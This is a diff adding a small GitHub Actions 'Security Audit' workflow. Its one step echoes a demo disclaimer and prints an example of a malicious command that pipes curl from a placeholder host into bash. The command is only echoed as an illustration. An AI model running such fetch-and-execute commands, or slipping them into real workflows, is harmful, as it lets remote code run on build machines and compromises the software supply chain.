@@ -1,0 +1,14 @@
+name: Security Audit
+
+on:
+  push:
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Audit
+        run: |
+          echo "DEMO ONLY — this is not executed as a remote script."
+          echo "A malicious workflow might run: curl -s http://example.invalid | bash"
